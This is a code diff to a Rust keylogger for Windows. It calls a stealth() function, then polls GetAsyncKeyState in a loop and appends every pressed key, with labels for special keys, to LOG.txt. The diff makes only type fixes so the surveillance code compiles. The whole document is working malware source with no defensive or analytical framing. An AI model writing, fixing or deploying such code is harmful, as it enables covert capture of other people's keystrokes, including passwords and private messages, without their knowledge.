@@ -3,6 +3,7 @@ extern crate user32;
 extern crate kernel32;
 use std::fs::{File, OpenOptions};
 use std::io::prelude::*;
+#[allow(unused_variables)]
 fn main() {
 	stealth();
 	let mut file = match OpenOptions::new().append(true).open("LOG.txt") {
@@ -12,22 +13,22 @@ fn main() {
   loop {
   	for i in 8..190 {
     	if unsafe { user32::GetAsyncKeyState(i) } == -32767 {
-    		let key  = match i as u32 {
-    			32 => " ",
-    			8 => "[Backspace]",
-    			13 => "\n",
-    			winapi::VK_TAB => "[TAB]",
-    			winapi::VK_SHIFT => "[SHIFT]",
-    			winapi::VK_CONTROL => "[CTRL]",
-    			winapi::VK_ESCAPE => "[ESCAPE]",
-    			winapi::VK_END => "[END]",
-    			winapi::VK_HOME => "[HOME]",
-    			winapi::VK_LEFT => "[LEFT]",
-    			winapi::VK_UP => "[UP]",
-    			winapi::VK_RIGHT => "[RIGHT]",
-    			winapi::VK_DOWN => "[DOWN]",
-    			190|110 => ".",
-    			_ => &(i as u8 as char).to_string();
+    		let key: String  = match i as u32 {
+    			32 => " ".into(),
+    			8 => "[Backspace]".into(),
+    			13 => "\n".into(),
+    			winapi::VK_TAB => "[TAB]".into(),
+    			winapi::VK_SHIFT => "[SHIFT]".into(),
+    			winapi::VK_CONTROL => "[CTRL]".into(),
+    			winapi::VK_ESCAPE => "[ESCAPE]".into(),
+    			winapi::VK_END => "[END]".into(),
+    			winapi::VK_HOME => "[HOME]".into(),
+    			winapi::VK_LEFT => "[LEFT]".into(),
+    			winapi::VK_UP => "[UP]".into(),
+    			winapi::VK_RIGHT => "[RIGHT]".into(),
+    			winapi::VK_DOWN => "[DOWN]".into(),
+    			190|110 => ".".into(),
+    			_ => (i as u8 as char).to_string()
     		};
     		write!(&mut file,"{}",key).unwrap();
     	}
